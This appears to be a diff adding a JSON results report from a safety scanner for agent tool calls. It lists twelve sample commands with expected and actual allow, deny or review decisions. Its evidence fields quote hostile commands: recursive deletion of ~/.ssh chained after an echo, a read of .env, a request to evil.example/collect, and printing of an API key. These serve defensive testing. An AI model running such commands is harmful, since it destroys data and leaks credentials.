@@ -1,0 +1,506 @@
+{
+  "policy_name": "example-tool-safety-policy",
+  "generated_at": "2026-07-04T00:00:00Z",
+  "sample_count": 12,
+  "decision_summary": {
+    "allow": 2,
+    "deny": 5,
+    "needs_human_review": 5
+  },
+  "results": [
+    {
+      "sample_id": "safe_python",
+      "description": "Safe Python computation with local output only.",
+      "expected_decision": "allow",
+      "expected_rules": [],
+      "match": true,
+      "report": {
+        "decision": "allow",
+        "risk_level": "low",
+        "findings": [],
+        "elapsed_ms": 0.0,
+        "redacted": false,
+        "blocked": false,
+        "language": "python",
+        "scanner_version": "0.1.0",
+        "policy_name": "example-tool-safety-policy",
+        "parser_error": null,
+        "metadata": {
+          "target_tool": "tool_safety_check"
+        }
+      }
+    },
+    {
+      "sample_id": "dangerous_delete",
+      "description": "Recursive deletion of a local directory.",
+      "expected_decision": "deny",
+      "expected_rules": [
+        "FILE_RECURSIVE_DELETE"
+      ],
+      "match": true,
+      "report": {
+        "decision": "deny",
+        "risk_level": "critical",
+        "findings": [
+          {
+            "rule_id": "FILE_RECURSIVE_DELETE",
+            "risk_type": "file_operation",
+            "risk_level": "critical",
+            "decision": "deny",
+            "message": "Recursive deletion of files or directories was detected.",
+            "evidence": "rm -rf ./build-cache",
+            "line": 1,
+            "column": null,
+            "recommendation": "Remove recursive deletion or require an isolated workspace with explicit approval.",
+            "redacted": false,
+            "metadata": {}
+          }
+        ],
+        "elapsed_ms": 0.0,
+        "redacted": false,
+        "blocked": true,
+        "language": "shell",
+        "scanner_version": "0.1.0",
+        "policy_name": "example-tool-safety-policy",
+        "parser_error": null,
+        "metadata": {
+          "target_tool": "tool_safety_check"
+        }
+      }
+    },
+    {
+      "sample_id": "read_secret_file",
+      "description": "Python reads a dotenv file.",
+      "expected_decision": "deny",
+      "expected_rules": [
+        "FILE_SENSITIVE_READ",
+        "FILE_FORBIDDEN_PATH_ACCESS"
+      ],
+      "match": true,
+      "report": {
+        "decision": "deny",
+        "risk_level": "critical",
+        "findings": [
+          {
+            "rule_id": "FILE_SENSITIVE_READ",
+            "risk_type": "file_operation",
+            "risk_level": "critical",
+            "decision": "deny",
+            "message": "Read access to a sensitive credential or configuration file was detected.",
+            "evidence": "open(\".env\", \"r\", encoding=\"utf-8\")",
+            "line": 1,
+            "column": null,
+            "recommendation": "Remove reads of sensitive files such as .env, SSH keys, or cloud credentials.",
+            "redacted": false,
+            "metadata": {}
+          },
+          {
+            "rule_id": "FILE_FORBIDDEN_PATH_ACCESS",
+            "risk_type": "file_operation",
+            "risk_level": "high",
+            "decision": "deny",
+            "message": "Access to a path denied by the safety policy was detected.",
+            "evidence": "open(\".env\", \"r\", encoding=\"utf-8\")",
+            "line": 1,
+            "column": null,
+            "recommendation": "Change the command to avoid denied paths or update the policy after review.",
+            "redacted": false,
+            "metadata": {}
+          }
+        ],
+        "elapsed_ms": 0.0,
+        "redacted": false,
+        "blocked": true,
+        "language": "python",
+        "scanner_version": "0.1.0",
+        "policy_name": "example-tool-safety-policy",
+        "parser_error": null,
+        "metadata": {
+          "target_tool": "tool_safety_check"
+        }
+      }
+    },
+    {
+      "sample_id": "network_non_whitelist",
+      "description": "Python sends a request to a non-allowlisted domain.",
+      "expected_decision": "deny",
+      "expected_rules": [
+        "NET_NON_WHITELIST_EGRESS"
+      ],
+      "match": true,
+      "report": {
+        "decision": "deny",
+        "risk_level": "high",
+        "findings": [
+          {
+            "rule_id": "NET_NON_WHITELIST_EGRESS",
+            "risk_type": "network_egress",
+            "risk_level": "high",
+            "decision": "deny",
+            "message": "Network egress to a non-allowlisted domain was detected.",
+            "evidence": "requests.get(\"https://evil.example/collect\")",
+            "line": 3,
+            "column": null,
+            "recommendation": "Use an allowlisted domain or add the domain to policy only after review.",
+            "redacted": false,
+            "metadata": {
+              "host": "evil.example"
+            }
+          }
+        ],
+        "elapsed_ms": 0.0,
+        "redacted": false,
+        "blocked": true,
+        "language": "python",
+        "scanner_version": "0.1.0",
+        "policy_name": "example-tool-safety-policy",
+        "parser_error": null,
+        "metadata": {
+          "target_tool": "tool_safety_check"
+        }
+      }
+    },
+    {
+      "sample_id": "network_whitelist",
+      "description": "Python sends a request to an allowlisted domain.",
+      "expected_decision": "allow",
+      "expected_rules": [],
+      "match": true,
+      "report": {
+        "decision": "allow",
+        "risk_level": "low",
+        "findings": [],
+        "elapsed_ms": 0.0,
+        "redacted": false,
+        "blocked": false,
+        "language": "python",
+        "scanner_version": "0.1.0",
+        "policy_name": "example-tool-safety-policy",
+        "parser_error": null,
+        "metadata": {
+          "target_tool": "tool_safety_check"
+        }
+      }
+    },
+    {
+      "sample_id": "subprocess_call",
+      "description": "Python invokes a subprocess and requires review.",
+      "expected_decision": "needs_human_review",
+      "expected_rules": [
+        "PROC_OS_SYSTEM"
+      ],
+      "match": true,
+      "report": {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "findings": [
+          {
+            "rule_id": "PROC_OS_SYSTEM",
+            "risk_type": "process_execution",
+            "risk_level": "medium",
+            "decision": "needs_human_review",
+            "message": "Subprocess execution was detected.",
+            "evidence": "subprocess.run([\"ls\", \"-la\"], check=False)",
+            "line": 3,
+            "column": null,
+            "recommendation": "Review the command and prefer structured subprocess invocation without shell expansion.",
+            "redacted": false,
+            "metadata": {}
+          },
+          {
+            "rule_id": "PROC_OS_SYSTEM",
+            "risk_type": "process_execution",
+            "risk_level": "medium",
+            "decision": "needs_human_review",
+            "message": "Command is not allowlisted by the safety policy.",
+            "evidence": "-la",
+            "line": 1,
+            "column": null,
+            "recommendation": "Review the command and prefer structured subprocess invocation without shell expansion.",
+            "redacted": false,
+            "metadata": {}
+          }
+        ],
+        "elapsed_ms": 0.0,
+        "redacted": false,
+        "blocked": true,
+        "language": "python",
+        "scanner_version": "0.1.0",
+        "policy_name": "example-tool-safety-policy",
+        "parser_error": null,
+        "metadata": {
+          "target_tool": "tool_safety_check"
+        }
+      }
+    },
+    {
+      "sample_id": "shell_injection",
+      "description": "Shell injection payload chains a harmless echo with dangerous deletion.",
+      "expected_decision": "deny",
+      "expected_rules": [
+        "PROC_SHELL_PIPE_OR_CHAIN",
+        "FILE_RECURSIVE_DELETE",
+        "FILE_SENSITIVE_READ"
+      ],
+      "match": true,
+      "report": {
+        "decision": "deny",
+        "risk_level": "critical",
+        "findings": [
+          {
+            "rule_id": "PROC_SHELL_PIPE_OR_CHAIN",
+            "risk_type": "process_execution",
+            "risk_level": "medium",
+            "decision": "needs_human_review",
+            "message": "Shell pipeline or command chaining was detected.",
+            "evidence": "echo \"hello\"; rm -rf ~/.ssh",
+            "line": 1,
+            "column": null,
+            "recommendation": "Review shell metacharacters and split commands into explicit safe steps when possible.",
+            "redacted": false,
+            "metadata": {}
+          },
+          {
+            "rule_id": "FILE_RECURSIVE_DELETE",
+            "risk_type": "file_operation",
+            "risk_level": "critical",
+            "decision": "deny",
+            "message": "Recursive deletion of files or directories was detected.",
+            "evidence": "echo \"hello\"; rm -rf ~/.ssh",
+            "line": 1,
+            "column": null,
+            "recommendation": "Remove recursive deletion or require an isolated workspace with explicit approval.",
+            "redacted": false,
+            "metadata": {}
+          },
+          {
+            "rule_id": "FILE_SENSITIVE_READ",
+            "risk_type": "file_operation",
+            "risk_level": "critical",
+            "decision": "deny",
+            "message": "Read access to a sensitive credential or configuration file was detected.",
+            "evidence": "echo \"hello\"; rm -rf ~/.ssh",
+            "line": 1,
+            "column": null,
+            "recommendation": "Remove reads of sensitive files such as .env, SSH keys, or cloud credentials.",
+            "redacted": false,
+            "metadata": {}
+          },
+          {
+            "rule_id": "FILE_FORBIDDEN_PATH_ACCESS",
+            "risk_type": "file_operation",
+            "risk_level": "high",
+            "decision": "deny",
+            "message": "Access to a path denied by the safety policy was detected.",
+            "evidence": "~/.ssh",
+            "line": 1,
+            "column": null,
+            "recommendation": "Change the command to avoid denied paths or update the policy after review.",
+            "redacted": false,
+            "metadata": {}
+          }
+        ],
+        "elapsed_ms": 0.0,
+        "redacted": false,
+        "blocked": true,
+        "language": "shell",
+        "scanner_version": "0.1.0",
+        "policy_name": "example-tool-safety-policy",
+        "parser_error": null,
+        "metadata": {
+          "target_tool": "tool_safety_check"
+        }
+      }
+    },
+    {
+      "sample_id": "dependency_install",
+      "description": "Python package installation requires review.",
+      "expected_decision": "needs_human_review",
+      "expected_rules": [
+        "DEP_PIP_INSTALL"
+      ],
+      "match": true,
+      "report": {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "findings": [
+          {
+            "rule_id": "DEP_PIP_INSTALL",
+            "risk_type": "dependency_install",
+            "risk_level": "medium",
+            "decision": "needs_human_review",
+            "message": "Python dependency installation was detected.",
+            "evidence": "python -m pip install suspicious-package",
+            "line": 1,
+            "column": null,
+            "recommendation": "Review dependency source and pinning before allowing package installation.",
+            "redacted": false,
+            "metadata": {}
+          }
+        ],
+        "elapsed_ms": 0.0,
+        "redacted": false,
+        "blocked": true,
+        "language": "shell",
+        "scanner_version": "0.1.0",
+        "policy_name": "example-tool-safety-policy",
+        "parser_error": null,
+        "metadata": {
+          "target_tool": "tool_safety_check"
+        }
+      }
+    },
+    {
+      "sample_id": "infinite_loop",
+      "description": "Python script contains an unbounded loop.",
+      "expected_decision": "needs_human_review",
+      "expected_rules": [
+        "RES_INFINITE_LOOP"
+      ],
+      "match": true,
+      "report": {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "findings": [
+          {
+            "rule_id": "RES_INFINITE_LOOP",
+            "risk_type": "resource_abuse",
+            "risk_level": "medium",
+            "decision": "needs_human_review",
+            "message": "Potential infinite loop was detected.",
+            "evidence": "while True:\n    pass",
+            "line": 1,
+            "column": null,
+            "recommendation": "Add bounded iteration, timeouts, or explicit cancellation conditions.",
+            "redacted": false,
+            "metadata": {}
+          }
+        ],
+        "elapsed_ms": 0.0,
+        "redacted": false,
+        "blocked": true,
+        "language": "python",
+        "scanner_version": "0.1.0",
+        "policy_name": "example-tool-safety-policy",
+        "parser_error": null,
+        "metadata": {
+          "target_tool": "tool_safety_check"
+        }
+      }
+    },
+    {
+      "sample_id": "sensitive_env_output",
+      "description": "Python prints a sensitive environment variable.",
+      "expected_decision": "deny",
+      "expected_rules": [
+        "LEAK_ENV_SECRET"
+      ],
+      "match": true,
+      "report": {
+        "decision": "deny",
+        "risk_level": "high",
+        "findings": [
+          {
+            "rule_id": "LEAK_ENV_SECRET",
+            "risk_type": "sensitive_leak",
+            "risk_level": "high",
+            "decision": "deny",
+            "message": "Sensitive environment variable output or exfiltration was detected.",
+            "evidence": "print(os.environ[\"OPENAI_API_KEY\"])",
+            "line": 3,
+            "column": null,
+            "recommendation": "Do not print, write, or send sensitive environment variable values.",
+            "redacted": false,
+            "metadata": {}
+          }
+        ],
+        "elapsed_ms": 0.0,
+        "redacted": false,
+        "blocked": true,
+        "language": "python",
+        "scanner_version": "0.1.0",
+        "policy_name": "example-tool-safety-policy",
+        "parser_error": null,
+        "metadata": {
+          "target_tool": "tool_safety_check"
+        }
+      }
+    },
+    {
+      "sample_id": "bash_pipe",
+      "description": "Bash pipeline requires review.",
+      "expected_decision": "needs_human_review",
+      "expected_rules": [
+        "PROC_SHELL_PIPE_OR_CHAIN"
+      ],
+      "match": true,
+      "report": {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "findings": [
+          {
+            "rule_id": "PROC_SHELL_PIPE_OR_CHAIN",
+            "risk_type": "process_execution",
+            "risk_level": "medium",
+            "decision": "needs_human_review",
+            "message": "Shell pipeline or command chaining was detected.",
+            "evidence": "cat input.log | grep ERROR",
+            "line": 1,
+            "column": null,
+            "recommendation": "Review shell metacharacters and split commands into explicit safe steps when possible.",
+            "redacted": false,
+            "metadata": {}
+          }
+        ],
+        "elapsed_ms": 0.0,
+        "redacted": false,
+        "blocked": true,
+        "language": "bash",
+        "scanner_version": "0.1.0",
+        "policy_name": "example-tool-safety-policy",
+        "parser_error": null,
+        "metadata": {
+          "target_tool": "tool_safety_check"
+        }
+      }
+    },
+    {
+      "sample_id": "human_review_dynamic_egress",
+      "description": "Shell command builds a dynamic network destination.",
+      "expected_decision": "needs_human_review",
+      "expected_rules": [
+        "NET_DYNAMIC_EGRESS_REVIEW"
+      ],
+      "match": true,
+      "report": {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "findings": [
+          {
+            "rule_id": "NET_DYNAMIC_EGRESS_REVIEW",
+            "risk_type": "network_egress",
+            "risk_level": "medium",
+            "decision": "needs_human_review",
+            "message": "Dynamic network destination construction was detected.",
+            "evidence": "curl \"https://${HOST}/status\"",
+            "line": 1,
+            "column": null,
+            "recommendation": "Review the destination construction or replace it with a static allowlisted domain.",
+            "redacted": false,
+            "metadata": {}
+          }
+        ],
+        "elapsed_ms": 0.0,
+        "redacted": false,
+        "blocked": true,
+        "language": "shell",
+        "scanner_version": "0.1.0",
+        "policy_name": "example-tool-safety-policy",
+        "parser_error": null,
+        "metadata": {
+          "target_tool": "tool_safety_check"
+        }
+      }
+    }
+  ]
+}
